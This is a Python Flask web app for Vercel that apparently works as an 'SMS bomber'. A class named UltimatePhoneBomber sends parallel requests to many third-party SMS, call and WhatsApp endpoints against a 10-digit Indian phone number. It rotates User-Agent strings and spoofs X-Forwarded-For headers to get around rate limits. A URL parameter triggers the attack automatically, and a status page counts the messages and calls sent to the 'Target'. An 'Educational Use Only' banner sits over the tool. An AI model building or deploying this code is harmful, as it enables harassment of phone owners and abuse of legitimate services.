# app.py - Vercel compatible version
from flask import Flask, render_template, request, jsonify
import time
import random
import hashlib
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# Import APIs from separate file
try:
    from apis import ULTIMATE_APIS
    print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs from apis.py")
except ImportError:
    print("❌ apis.py not found, using demo APIs")
    # Fallback demo APIs
    ULTIMATE_APIS = [
        {
            "name": "Demo API 1",
            "url": "https://httpbin.org/post",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","test":true}}',
            "category": "demo",
            "enabled": True
        },
        {
            "name": "Demo API 2", 
            "url": "https://httpbin.org/get",
            "method": "GET",
            "headers": {},
            "data": None,
            "category": "demo",
            "enabled": True
        }
    ]

class UltimatePhoneBomber:
    def __init__(self):
        self.active_operations = {}
        self.executor = ThreadPoolExecutor(max_workers=10)
        
    def generate_request_id(self, phone):
        """Generate unique request ID"""
        timestamp = int(time.time())
        random_id = random.randint(1000, 9999)
        return f"{phone}_{timestamp}_{random_id}"
    
    def execute_api_request(self, api, phone):
        """Execute single API request synchronously"""
        try:
            name = api["name"]
            
            # Prepare URL
            if callable(api["url"]):
                url = api["url"](phone)
            else:
                url = api["url"]
            
            # Prepare headers with rotation
            headers = api["headers"].copy()
            
            # Rotate User-Agent
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36",
            ]
            
            headers["User-Agent"] = random.choice(user_agents)
            
            # Rotate IP
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Real-IP"] = headers["X-Forwarded-For"]
            
            start_time = time.time()
            
            if api["method"] == "POST":
                data = api["data"](phone) if api["data"] else None
                if data and isinstance(data, str) and data.strip().startswith('{'):
                    try:
                        data = json.loads(data)
                    except:
                        pass
                
                response = requests.post(url, headers=headers, json=data if isinstance(data, dict) else None, 
                                        data=data if not isinstance(data, dict) else None, timeout=3)
            else:
                response = requests.get(url, headers=headers, timeout=3)
            
            response_time = time.time() - start_time
            
            success = response.status_code in [200, 201, 202]
            
            return {
                "name": name,
                "status": response.status_code,
                "success": success,
                "time": response_time,
                "category": api.get("category", "sms"),
                "response_text": response.text[:100] if response.text else ""
            }
            
        except Exception as e:
            return {
                "name": api["name"] if api else "Unknown",
                "status": 0,
                "success": False,
                "error": str(e),
                "time": 0,
                "category": api.get("category", "sms") if api else "unknown"
            }
    
    def start_bombing(self, phone, request_id):
        """Start bombing with all APIs"""
        operation = {
            "request_id": request_id,
            "phone": phone,
            "start_time": time.time(),
            "total_apis": len(ULTIMATE_APIS),
            "completed": 0,
            "successful": 0,
            "failed": 0,
            "calls": 0,
            "whatsapp": 0,
            "sms": 0,
            "results": [],
            "status": "running"
        }
        
        self.active_operations[request_id] = operation
        
        try:
            # Submit all API calls to thread pool
            future_to_api = {}
            for api in ULTIMATE_APIS[:20]:  # Limit to 20 APIs for Vercel timeout
                if api.get("enabled", True):
                    future = self.executor.submit(self.execute_api_request, api, phone)
                    future_to_api[future] = api
            
            # Collect results as they complete
            for future in as_completed(future_to_api):
                result = future.result()
                api = future_to_api[future]
                
                operation["results"].append(result)
                operation["completed"] += 1
                
                if result["success"]:
                    operation["successful"] += 1
                    category = result.get("category", "sms")
                    if category == "call":
                        operation["calls"] += 1
                    elif category == "whatsapp":
                        operation["whatsapp"] += 1
                    else:
                        operation["sms"] += 1
                else:
                    operation["failed"] += 1
                
                # Update operation in dictionary
                self.active_operations[request_id] = operation
            
            operation["end_time"] = time.time()
            operation["duration"] = operation["end_time"] - operation["start_time"]
            operation["status"] = "completed"
            
        except Exception as e:
            operation["error"] = str(e)
            operation["status"] = "failed"
            operation["end_time"] = time.time()
            operation["duration"] = operation["end_time"] - operation["start_time"]
        
        return operation
    
    def get_operation_status(self, request_id):
        """Get operation status"""
        return self.active_operations.get(request_id)

# Initialize bomber
bomber = UltimatePhoneBomber()

@app.route('/')
def home():
    """Home page"""
    phone = request.args.get('number', '')
    auto = request.args.get('auto', 'false').lower()
    
    if phone and len(phone) == 10 and phone.isdigit() and auto == 'true':
        # Auto-start bombing
        request_id = bomber.generate_request_id(phone)
        
        # Start bombing in background thread
        import threading
        thread = threading.Thread(target=bomber.start_bombing, args=(phone, request_id))
        thread.daemon = True
        thread.start()
        
        # Redirect to status page
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Starting Operation...</title>
            <meta http-equiv="refresh" content="1;url=/status/{request_id}">
            <style>
                body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
                .loader {{ border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }}
                @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            </style>
        </head>
        <body>
            <h1>🚀 Starting Operation</h1>
            <div class="loader"></div>
            <p>Target: +91{phone}</p>
            <p>APIs: {len(ULTIMATE_APIS)}</p>
            <p>Redirecting to status page...</p>
        </body>
        </html>
        '''
    
    # Normal home page
    call_apis = len([api for api in ULTIMATE_APIS if api.get("category") == "call"])
    sms_apis = len([api for api in ULTIMATE_APIS if api.get("category") == "sms"])
    whatsapp_apis = len([api for api in ULTIMATE_APIS if api.get("category") == "whatsapp"])
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>API Testing Tool</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }}
            .container {{ max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }}
            h1 {{ color: #333; text-align: center; margin-bottom: 10px; }}
            .subtitle {{ text-align: center; color: #666; margin-bottom: 30px; }}
            .stats {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 25px 0; }}
            .stat-box {{ background: #f8f9fa; padding: 15px; border-radius: 8px; text-align: center; }}
            .stat-number {{ font-size: 24px; font-weight: bold; color: #667eea; }}
            .form-group {{ margin-bottom: 20px; }}
            label {{ display: block; margin-bottom: 8px; color: #555; font-weight: 600; }}
            input {{ width: 100%; padding: 12px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 16px; transition: border-color 0.3s; }}
            input:focus {{ outline: none; border-color: #667eea; }}
            button {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }}
            button:hover {{ transform: translateY(-2px); box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4); }}
            .warning {{ background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 8px; margin: 20px 0; font-size: 14px; }}
            .quick-links {{ text-align: center; margin-top: 20px; }}
            .quick-link {{ display: inline-block; margin: 0 10px; padding: 8px 16px; background: #28a745; color: white; text-decoration: none; border-radius: 5px; font-size: 14px; }}
            .quick-link:hover {{ background: #218838; }}
            .footer {{ text-align: center; margin-top: 30px; color: #666; font-size: 14px; }}
            .url-example {{ background: #f8f9fa; padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace; font-size: 12px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔧 API Testing Tool</h1>
            <p class="subtitle">Educational Testing Platform</p>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number">{len(ULTIMATE_APIS)}</div>
                    <div>Total APIs</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">{call_apis}</div>
                    <div>Call APIs</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">{sms_apis}</div>
                    <div>SMS APIs</div>
                </div>
            </div>
            
            <div class="warning">
                ⚠️ <strong>Educational Use Only</strong><br>
                This tool is for testing and educational purposes only.
            </div>
            
            <form id="testForm">
                <div class="form-group">
                    <label for="phone">Test Number (10 digits):</label>
                    <input type="text" id="phone" name="phone" placeholder="Enter 10-digit number" maxlength="10" value="{phone}" required>
                </div>
                
                <button type="button" onclick="startTest()">🚀 Start API Testing</button>
            </form>
            
            <div class="quick-links">
                <p>Quick test:</p>
                <a href="/?number=9876543210&auto=true" class="quick-link">Test with 9876543210</a>
                <a href="/?number=9999999999&auto=true" class="quick-link">Test with 9999999999</a>
            </div>
            
            <div class="url-example">
                URL format: https://your-domain.vercel.app/?number=PHONE&auto=true
            </div>
            
            <div class="footer">
                <p>Hosted on Vercel | Session Rotation Enabled</p>
            </div>
        </div>
        
        <script>
            function startTest() {{
                const phone = document.getElementById('phone').value;
                if (phone.length === 10 && /^\\d+$/.test(phone)) {{
                    window.location.href = '/?number=' + phone + '&auto=true';
                }} else {{
                    alert('Please enter a valid 10-digit number');
                }}
            }}
            
            // Auto-start if phone is provided
            const urlParams = new URLSearchParams(window.location.search);
            const phoneParam = urlParams.get('number');
            if (phoneParam && phoneParam.length === 10 && /^\\d+$/.test(phoneParam)) {{
                document.getElementById('phone').value = phoneParam;
            }}
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/status/<request_id>')
def status_page(request_id):
    """Status page for ongoing operation"""
    operation = bomber.get_operation_status(request_id)
    
    if not operation:
        return '''
        <html>
        <head>
            <title>Operation Not Found</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                .error { color: #dc3545; margin: 20px 0; }
            </style>
        </head>
        <body>
            <h1>Operation Not Found</h1>
            <div class="error">The requested operation does not exist or has expired.</div>
            <a href="/" style="padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 5px;">Return to Home</a>
        </body>
        </html>
        '''
    
    # Auto-refresh if still running
    refresh_tag = ''
    if operation["status"] == "running":
        refresh_tag = '<meta http-equiv="refresh" content="2">'
    
    # Calculate progress percentage
    progress_percent = (operation["completed"] / operation["total_apis"] * 100) if operation["total_apis"] > 0 else 0
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Operation Status</title>
        {refresh_tag}
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; background: #f5f5f5; padding: 20px; }}
            .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }}
            h1 {{ color: #333; margin-bottom: 10px; }}
            .info {{ color: #666; margin-bottom: 30px; }}
            .stats-grid {{ display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0; }}
            @media (min-width: 768px) {{ .stats-grid {{ grid-template-columns: repeat(4, 1fr); }} }}
            .stat-card {{ background: #f8f9fa; padding: 20px; border-radius: 10px; text-align: center; }}
            .stat-number {{ font-size: 28px; font-weight: bold; margin: 10px 0; }}
            .stat-call {{ border-left: 4px solid #dc3545; }}
            .stat-whatsapp {{ border-left: 4px solid #25d366; }}
            .stat-sms {{ border-left: 4px solid #ffc107; }}
            .stat-total {{ border-left: 4px solid #007bff; }}
            .progress-container {{ margin: 30px 0; }}
            .progress-label {{ display: flex; justify-content: space-between; margin-bottom: 5px; }}
            .progress-bar {{ height: 20px; background: #e9ecef; border-radius: 10px; overflow: hidden; }}
            .progress-fill {{ height: 100%; background: linear-gradient(90deg, #007bff, #0056b3); width: {progress_percent}%; transition: width 0.3s; }}
            .status {{ padding: 10px; border-radius: 5px; text-align: center; font-weight: bold; margin: 20px 0; }}
            .status-running {{ background: #fff3cd; color: #856404; }}
            .status-completed {{ background: #d4edda; color: #155724; }}
            .status-failed {{ background: #f8d7da; color: #721c24; }}
            .results {{ margin-top: 30px; }}
            .result-item {{ padding: 15px; margin: 10px 0; border-radius: 8px; background: #f8f9fa; }}
            .result-success {{ border-left: 4px solid #28a745; }}
            .result-failed {{ border-left: 4px solid #dc3545; }}
            .btn {{ display: inline-block; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; margin-top: 20px; }}
            .btn:hover {{ background: #0056b3; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 Operation Status</h1>
            <div class="info">
                <p>ID: <strong>{request_id}</strong></p>
                <p>Target: <strong>+91{operation.get('phone', 'N/A')}</strong></p>
                <p>Started: <strong>{time.ctime(operation['start_time'])}</strong></p>
            </div>
            
            <div class="stats-grid">
                <div class="stat-card stat-total">
                    <div>Total APIs</div>
                    <div class="stat-number">{operation["total_apis"]}</div>
                </div>
                <div class="stat-card stat-call">
                    <div>Calls</div>
                    <div class="stat-number">{operation["calls"]}</div>
                </div>
                <div class="stat-card stat-whatsapp">
                    <div>WhatsApp</div>
                    <div class="stat-number">{operation["whatsapp"]}</div>
                </div>
                <div class="stat-card stat-sms">
                    <div>SMS</div>
                    <div class="stat-number">{operation["sms"]}</div>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-label">
                    <span>Progress: {operation["completed"]}/{operation["total_apis"]}</span>
                    <span>{progress_percent:.1f}%</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill"></div>
                </div>
            </div>
            
            <div class="status status-{operation["status"]}">
                Status: {operation["status"].upper()}
                {f" | Duration: {operation.get('duration', time.time() - operation['start_time']):.2f}s" if operation.get('duration') else ""}
            </div>
            
            <div class="results">
                <h3>Recent Results ({len(operation["results"])})</h3>
                {''.join([
                    f'<div class="result-item {"result-success" if r.get("success") else "result-failed"}">'
                    f'<strong>{r.get("name", "Unknown")}</strong><br>'
                    f'Status: {r.get("status", "N/A")} | '
                    f'Time: {r.get("time", 0):.2f}s | '
                    f'Category: {r.get("category", "unknown")}<br>'
                    f'{"✅ Success" if r.get("success") else "❌ Failed"}'
                    f'</div>'
                    for r in operation["results"][-5:]  # Show last 5 results
                ])}
            </div>
            
            <div style="text-align: center;">
                <a href="/" class="btn">🏠 New Test</a>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/api/start', methods=['POST'])
def api_start():
    """API endpoint to start testing"""
    data = request.json or request.form
    phone = data.get('phone', '')
    
    if not phone or len(phone) != 10 or not phone.isdigit():
        return jsonify({"error": "Invalid phone number"}), 400
    
    request_id = bomber.generate_request_id(phone)
    
    # Start bombing in background
    import threading
    thread = threading.Thread(target=bomber.start_bombing, args=(phone, request_id))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "success": True,
        "request_id": request_id,
        "message": "Testing operation started",
        "status_url": f"/status/{request_id}",
        "apis_count": len(ULTIMATE_APIS)
    })

@app.route('/api/status/<request_id>')
def api_status(request_id):
    """API endpoint for status"""
    operation = bomber.get_operation_status(request_id)
    
    if not operation:
        return jsonify({"error": "Operation not found"}), 404
    
    return jsonify(operation)

@app.route('/api/info')
def api_info():
    """API information"""
    return jsonify({
        "total_apis": len(ULTIMATE_APIS),
        "apis_by_category": {
            "call": len([api for api in ULTIMATE_APIS if api.get("category") == "call"]),
            "whatsapp": len([api for api in ULTIMATE_APIS if api.get("category") == "whatsapp"]),
            "sms": len([api for api in ULTIMATE_APIS if api.get("category") == "sms"]),
            "demo": len([api for api in ULTIMATE_APIS if api.get("category") == "demo"])
        },
        "active_operations": len(bomber.active_operations)
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "timestamp": time.time()})

# This is required for Vercel
if __name__ == '__main__':
    app.run(debug=True)
else:
    # For Vercel serverless
    application = app
